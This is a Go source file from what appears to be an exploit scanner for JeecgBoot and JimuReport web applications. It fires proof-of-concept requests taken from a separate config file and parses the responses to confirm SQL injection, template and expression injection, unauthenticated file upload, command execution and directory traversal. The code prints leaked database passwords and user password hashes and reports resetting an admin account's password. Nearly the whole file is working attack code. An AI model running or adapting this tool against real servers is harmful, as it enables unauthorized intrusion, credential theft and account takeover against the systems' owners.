package Core

import (
	common "JeecgExploitssGo/Common"
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

func RequestResult(url, token, method string, body []byte) []byte {
	var reqBody io.Reader

	if body != nil {
		reqBody = bytes.NewReader(body)
	}

	request, err := http.NewRequest(method, url, reqBody)
	if err != nil {
		common.Colors(common.ColorRed).Printf("[-]构造请求失败, %v\n", err)
		return nil
	}

	// fmt.Println(request)

	request.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0")
	request.Header.Set("X-Access-Token", token)
	if method == "POST" {
		request.Header.Set("Content-Type", "application/json")
	}

	tls := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		Transport: tls,
		Timeout:   time.Second * 30,
	}

	response, err := client.Do(request)
	if err != nil {
		common.Colors(common.ColorRed).Printf("[-]请求URL: %s 失败, %v\n", url, err)
		return nil
	}

	defer response.Body.Close()

	resBody, err := io.ReadAll(response.Body)
	if err != nil {
		common.Colors(common.ColorRed).Printf("读取响应内容失败, %v\n", err)
		return nil
	}

	return resBody
}

func RoutineRequest() {
	Flags()

	for name, requestConfig := range common.ReadFile().Requests {
		fmt.Println("[*]正在测试 ", name)
		// fmt.Println(requestConfig.URL)
		// fmt.Println(requestConfig.Method)
		// fmt.Println(requestConfig.UserAgent)
		// fmt.Println(requestConfig.ContentType)
		// fmt.Println(requestConfig.Body)

		urls := common.JoinURL(Urls, requestConfig.URL)

		request, err := http.NewRequest(requestConfig.Method, urls, bytes.NewBuffer([]byte(requestConfig.Body)))
		if err != nil {
			common.Colors(common.ColorRed).Printf("[-]构造请求失败, %v\n", err)
			continue
		}

		// fmt.Println(request)

		request.Header.Set("User-Agent", requestConfig.UserAgent)
		request.Header.Set("Content-Type", requestConfig.ContentType)
		request.Header.Set("X-Access-Token", Token)

		// 针对 /jmreport/testConnection 远程命令执行
		// if name == "testConnection" {
		// 	request.Header.Set("Cmd", "whoami")
		// }

		tls := &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}

		client := &http.Client{
			Transport: tls,
			Timeout:   time.Second * 30,
		}

		requestStrat := time.Now()
		response, err := client.Do(request)
		if err != nil {
			common.Colors(common.ColorRed).Printf("[-]请求URL: %s 失败, %v\n", requestConfig.URL, err)
			continue
		}
		responseTimes := time.Since(requestStrat)

		defer response.Body.Close()

		// 控制响应内容大小
		// limitReader := io.LimitReader(response.Body, int64(ResponseContnet))

		body, err := io.ReadAll(response.Body)
		if err != nil {
			common.Colors(common.ColorRed).Printf("读取响应内容失败, %v\n", err)
			continue
		}

		// /sys/duplicate/check SQL注入
		if name == "check_poc_1" || name == "check_poc_2" {
			if responseTimes >= time.Second*5 {
				common.Colors(common.ColorGreen).Printf("[+]%s 存在check SQL注入漏洞\n", Urls)
				common.Colors(common.ColorYellow).Printf("[+++]payload: %s\n", requestConfig.URL)
			}
		}

		if name == "column" {
			if responseTimes >= time.Second*5 {
				common.Colors(common.ColorGreen).Printf("[+]%s column参数SQL注入漏洞\n", Urls)
				common.Colors(common.ColorYellow).Printf("[+++]payload: %s\n", requestConfig.URL)
			}
		}

		status := response.Status

		// 不打印不存在漏洞的请求
		failed := strings.HasPrefix(status, "30") ||
			strings.HasPrefix(status, "40") ||
			strings.HasPrefix(status, "50") ||
			strings.Contains(string(body), "Token失效") ||
			strings.Contains(string(body), "token??") ||
			strings.Contains(string(body), "失败") ||
			strings.Contains(string(body), "没有权限")
			// fmt.Println(string(body))

		if !failed {
			switch name {
			// /sys/dict/queryTableData SQL注入
			case "queryTableData":
				common.Colors(common.ColorGreen).Printf("[+]%s 存在 %s 漏洞\n", Urls, name)
				var queryTableDataResults common.QueryTableData

				if err := json.Unmarshal([]byte(body), &queryTableDataResults); err != nil {
					common.Colors(common.ColorRed).Printf("[*]解析 json 失败, %v\n", err)
					continue
				}

				value := queryTableDataResults.QueryTableDataResult[1].Value
				text := queryTableDataResults.QueryTableDataResult[1].Text
				label := queryTableDataResults.QueryTableDataResult[1].Label

				common.Colors(common.ColorYellow).Printf("[+++]value: %s information_schema: %s label: %s\n", value, text, label)

				common.OutputFile(Urls+requestConfig.URL, requestConfig.Body, string(body))

			// /jmreport/qurestSql 接口SQL注入
			case "qurestSql":
				if strings.Contains(string(body), "发布模式不允许使用在线配置") {
					continue
				}
				var sendMsgResults common.QurestSql

				if err := json.Unmarshal([]byte(body), &sendMsgResults); err != nil {
					common.Colors(common.ColorRed).Printf("[*]解析 json 失败, %v\n", err)
					continue
				}

				if !strings.Contains(sendMsgResults.Message, "错误") {
					common.Colors(common.ColorGreen).Printf("[+]%s 存在 %s 漏洞\n", Urls, name)

					for _, content := range sendMsgResults.QurestSqlResult {
						common.Colors(common.ColorYellow).Printf("[+++]dbname: %s, version: %s\n", content.GData, content.TData)
					}

					common.OutputFile(Urls+requestConfig.URL, requestConfig.Body, string(body))
				}

			// /jmreport/loadTableData SSTI模板注入漏洞
			case "loadTableData_poc_1":
				if strings.Contains(string(body), "发布模式不允许使用在线配置") {
					continue
				}
				common.Colors(common.ColorGreen).Printf("[+]%s 存在loadTableData SSTI模板注入漏洞, %s\n", Urls, name)
				// var loadTabResult common.LoadTableData

				if err := json.Unmarshal([]byte(body), &common.LoadTableData_poc_1); err != nil {
					common.Colors(common.ColorRed).Printf("[*]解析 json 失败, %v\n", err)
					continue
				}

				loadTabResult := map[string]interface{}{
					"records": common.LoadTableData_poc_1.LoadTableDataResult.LoadTableDataRecords,
				}

				outputJSON, _ := json.Marshal(loadTabResult)
				common.Colors(common.ColorYellow).Printf("[+++]%s\n", string(outputJSON))

				common.OutputFile(Urls+requestConfig.URL, requestConfig.Body, string(body))
			case "loadTableData_poc_2":
				common.Colors(common.ColorGreen).Printf("[+]%s 存在loadTableData SSTI模板注入漏洞, %s\n", Urls, name)
				// var loadTabResult common.LoadTableData

				if err := json.Unmarshal([]byte(body), &common.LoadTableData_poc_2); err != nil {
					common.Colors(common.ColorRed).Printf("[*]解析 json 失败, %v\n", err)
					continue
				}

				loadTabResult := map[string]interface{}{
					"records": common.LoadTableData_poc_2.LoadTableDataResult.LoadTableDataRecords,
				}

				outputJSON, _ := json.Marshal(loadTabResult)
				common.Colors(common.ColorYellow).Printf("[+++]%s\n", string(outputJSON))

				common.OutputFile(Urls+requestConfig.URL, requestConfig.Body, string(body))

			// /jmreport/queryFieldBySql 模板注入
			case "queryFieldBySql":
				common.Colors(common.ColorGreen).Printf("[+]%s 存在queryFieldBySql模板注入漏洞\n", Urls)

				if err := json.Unmarshal([]byte(body), &common.QueryFieldBySql); err != nil {
					common.Colors(common.ColorRed).Printf("[*]解析 json 失败, %v\n", err)
					continue
				}
				queryFieldBySqlResult := map[string]interface{}{
					"fieldList": common.QueryFieldBySql.QueryFieldBySqlResult.QueryFieldBySqlFieldList,
				}

				outputJSON, _ := json.Marshal(queryFieldBySqlResult)
				common.Colors(common.ColorYellow).Printf("[+++]%s\n", string(outputJSON))

				common.OutputFile(Urls+requestConfig.URL, requestConfig.Body, string(body))

			case "passwordChange":
				common.Colors(common.ColorGreen).Printf("[+]%s 存在 %s 漏洞\n", Urls, name)
				common.Colors(common.ColorGreen).Println("[+++]重置账号密码为 [jeecg/YioVke@1743]")

				common.OutputFile(Urls+requestConfig.URL, requestConfig.Body, string(body))

			case "checkOnlyUser", "querySysUser":
				common.Colors(common.ColorGreen).Printf("[+]%s 存在%s信息泄露漏洞\n", Urls, name)
				common.Colors(common.ColorYellow).Printf("[+++]%s%s\n", Urls, requestConfig.URL)

				common.OutputFile(Urls+requestConfig.URL, requestConfig.Body, string(body))

			case "httptrace_poc_1", "httptrace_poc_2", "httptrace_poc_3":
				var httptraceResults common.Httptrace

				if err := json.Unmarshal([]byte(body), &httptraceResults); err != nil {
					common.Colors(common.ColorRed).Printf("[*]解析 json 失败, %v\n", err)
					continue
				}

				if len(httptraceResults.HttptraceResult) > 1 {
					common.Colors(common.ColorGreen).Printf("[+]%s 存在httptrace信息泄露漏洞, %s\n", Urls, name)
					common.Colors(common.ColorYellow).Printf("[+++]%s%s\n", Urls, requestConfig.URL)
				}

				common.OutputFile(Urls+requestConfig.URL, requestConfig.Body, string(body))

			// 目录遍历漏洞
			case "fileTree":
				common.Colors(common.ColorGreen).Printf("[+]%s 存在目录遍历漏洞\n", Urls)
				var fileTree common.FileTree

				if err := json.Unmarshal([]byte(body), &fileTree); err != nil {
					common.Colors(common.ColorRed).Printf("[*]解析 json 失败, %v\n", err)
					continue
				}

				key1 := fileTree.FileTreeResult[1].Key
				key2 := fileTree.FileTreeResult[2].Key
				key3 := fileTree.FileTreeResult[3].Key
				key4 := fileTree.FileTreeResult[4].Key
				key5 := fileTree.FileTreeResult[5].Key

				common.Colors(common.ColorYellow).Printf("[+++]%s,%s,%s,%s,%s\n", key1, key2, key3, key4, key5)

				common.OutputFile(Urls+requestConfig.URL, requestConfig.Body, string(body))

			// 数据库账号密码泄露
			case "dataSource_list":
				var dataSource_list common.DataSource_list

				if err := json.Unmarshal([]byte(body), &dataSource_list); err != nil {
					common.Colors(common.ColorRed).Printf("[*]解析 json 失败, %v\n", err)
					continue
				}

				if len(dataSource_list.DataSourceResult.DataSourceRecords) > 1 {
					common.Colors(common.ColorGreen).Printf("[+]%s 存在数据库账号密码泄露\n", Urls)

					records := dataSource_list.DataSourceResult.DataSourceRecords[0]
					common.Colors(common.ColorYellow).Printf("[+++]dbName: %s, dbUsername: %s, dbPassword: %s\n", records.DbName, records.DbUsername, records.DbPassword)
				}

				common.OutputFile(Urls+requestConfig.URL, requestConfig.Body, string(body))

			// sendMsg接口存在freemaker模板注入
			case "sendMsg_sendMsg":
				if strings.Contains(string(body), "成功") {
					api := "/sys/message/sysMessage/list?_t=1732776144&column=createTime&order=desc&field=id,,,esTitle,esContent,esReceiver,esSendNum,esSendStatus_dictText,esSendTime,esType_dictText,action&pageNo=1&pageSize=10"
					sendMsgBody := RequestResult(Urls+api, Token, "GET", nil)

					common.Colors(common.ColorGreen).Printf("[+]%s sendMsg接口存在freemaker模板注入\n", Urls)

					var sendMsgResults common.SendMsg

					if err := json.Unmarshal([]byte(sendMsgBody), &sendMsgResults); err != nil {
						common.Colors(common.ColorRed).Printf("[*]解析 json 失败, %v\n", err)
						continue
					}

					records := sendMsgResults.SendMsgResults.SendMsgRecords[0].EsContent
					common.Colors(common.ColorYellow).Printf("[+++]%s\n", records)

					common.OutputFile(Urls+requestConfig.URL, requestConfig.Body, string(body))

				}
			// getDictItemsByTable 后台未授权SQL注入漏洞
			case "getDictItemsByTableBackSql":
				common.Colors(common.ColorGreen).Printf("[+]%s 存在getDictItemsByTable后台未授权SQL注入漏洞\n", Urls)

				var getDictItemsByTableBackSqlResult common.GetDictItemsByTableBackSql

				if err := json.Unmarshal([]byte(body), &getDictItemsByTableBackSqlResult); err != nil {
					common.Colors(common.ColorRed).Printf("[*]解析 json 失败, %v\n", err)
					continue
				}

				common.Colors(common.ColorYellow).Printf("[+++]label: %s, value: %s\n", getDictItemsByTableBackSqlResult[0].Label, getDictItemsByTableBackSqlResult[0].Value)

				common.OutputFile(Urls+requestConfig.URL, requestConfig.Body, string(body))

			// /sys/ng-alain/getDictItemsByTable SQL注入漏洞
			case "getDictItemsByTable":
				common.Colors(common.ColorGreen).Printf("[+]%s 存在getDictItemsByTable SQL注入漏洞\n", Urls)

				var getDictItemsByTableResult common.GetDictItemsByTable

				if err := json.Unmarshal([]byte(body), &getDictItemsByTableResult); err != nil {
					common.Colors(common.ColorRed).Printf("[*]解析 json 失败, %v\n", err)
					continue
				}

				username := getDictItemsByTableResult[0].Username
				password := getDictItemsByTableResult[0].Password
				salt := getDictItemsByTableResult[0].Salt

				common.Colors(common.ColorYellow).Printf("[+++]username: %s, password: %s, salt: %s\n", username, password, salt)

				common.OutputFile(Urls+requestConfig.URL, requestConfig.Body, string(body))

			// /jmreport/upload 接口未授权任意文件上传
			case "jmreportUpload":
				var jmreportUploadPath common.JmreportUpload

				if err := json.Unmarshal([]byte(body), &jmreportUploadPath); err != nil {
					common.Colors(common.ColorRed).Printf("[*]解析 json 失败, %v\n", err)
					continue
				}

				uploadPath := jmreportUploadPath.Message

				body := RequestResult(Urls+uploadPath, Token, "GET", nil)

				if string(body) == "YLe73MwsR2==" {
					common.Colors(common.ColorGreen).Printf("[+]%s 存在jmreportUpload接口未授权任意文件上传漏洞\n", Urls)
					common.Colors(common.ColorYellow).Printf("[+++]upload: %s\n", uploadPath)

					common.OutputFile(Urls+requestConfig.URL, requestConfig.Body, string(body))
				}

			// /jmreport/testConnection 远程命令执行
			case "testConnection":
				var testConnectionResult common.JmreportUpload

				if err := json.Unmarshal([]byte(body), &testConnectionResult); err != nil {
					common.Colors(common.ColorRed).Printf("[*]解析 json 失败, %v\n", err)
					continue
				}

				message := testConnectionResult.Message

				if message == "数据库连接成功" {
					common.Colors(common.ColorGreen).Printf("[+]%s 存在testConnection远程命令执行\n", Urls)
					common.Colors(common.ColorYellow).Printf("[+++]message: %s\n", message)
				}

			// /onlDragDatasetHead/getTotalData SQL注入
			case "getTotalData":
				var getTotalDataResult common.GetTotalData

				if err := json.Unmarshal([]byte(body), &getTotalDataResult); err != nil {
					common.Colors(common.ColorRed).Printf("[*]解析 json 失败, %v\n", err)
					continue
				}

				if len(getTotalDataResult.GetTotalDataResult.ChartData) > 0 || len(getTotalDataResult.GetTotalDataResult.RawData) > 0 {
					common.Colors(common.ColorGreen).Printf("[+]%s 存在getTotalData SQL注入漏洞\n", Urls)

					chartDataName := getTotalDataResult.GetTotalDataResult.ChartData[0].Name
					rRawDataName := getTotalDataResult.GetTotalDataResult.RawData[0].Name

					common.Colors(common.ColorYellow).Printf("[+++]version: %s\n", chartDataName)
					common.Colors(common.ColorYellow).Printf("[+++]version: %s\n", rRawDataName)
				}

			// AviatorScript表达式注入漏洞
			case "aviatorScript":
				var aviatorScriptResult common.AviatorScript

				if err := json.Unmarshal([]byte(body), &aviatorScriptResult); err != nil {
					common.Colors(common.ColorRed).Printf("[*]解析 json 失败, %v\n", err)
					continue
				}

				id := aviatorScriptResult.AviatorScriptResult.ID
				code := aviatorScriptResult.AviatorScriptResult.Code
				jsonStr := aviatorScriptResult.AviatorScriptResult.JsonStr

				if id == "980882669965455363" && code != "" && jsonStr != "" {
					common.Colors(common.ColorGreen).Printf("[+]%s 存在AviatorScript表达式注入漏洞\n", Urls)
					common.Colors(common.ColorYellow).Printf("[+++]id: %s, code: %s\n", id, code)
				}

			// /jmreport/show SQL注入漏洞
			case "show":
				var showResult common.Show

				if err := json.Unmarshal([]byte(body), &showResult); err != nil {
					common.Colors(common.ColorRed).Printf("[*]解析 json 失败, %v\n", err)
					continue
				}

				if strings.Contains(showResult.Message, "PreparedStatementCallback") {
					common.Colors(common.ColorGreen).Printf("[+]%s 存在jmreportshow SQL注入漏洞\n", Urls)
					common.Colors(common.ColorYellow).Printf("[+++]message: %s\n", showResult.Message)
				}

			// parseSql接口SQL注入
			case "parseSql":
				var parseSqlResult common.ParseSql

				if err := json.Unmarshal([]byte(body), &parseSqlResult); err != nil {
					common.Colors(common.ColorRed).Printf("[*]解析 json 失败, %v\n", err)
					continue
				}

				fieldName := parseSqlResult.ParseSqlResult.ParseSqlFields[0].FieldName
				fieldTxt := parseSqlResult.ParseSqlResult.ParseSqlFields[0].FieldTxt

				if fieldName == "schema_name" || fieldTxt == "SCHEMA_NAME" {
					common.Colors(common.ColorGreen).Printf("[+]%s 存在parseSql SQL注入漏洞\n", Urls)
					common.Colors(common.ColorYellow).Printf("[+++]fieldName: %s, fieldTxt: %s\n", fieldName, fieldTxt)
				}

			// commonController 接口任意文件上传漏洞
			// 未复现
			case "commonController":
				if strings.Contains(string(body), "操作成功") {
					common.Colors(common.ColorGreen).Printf("[+]%s commonController接口存在任意文件上传漏洞\n", Urls)
				}

			}

			// common.Colors(common.ColorYellow).Printf("%v\n", string(body))
		}

		// 延时请求
		time.Sleep(time.Second * time.Duration(SetTime))

	}

}
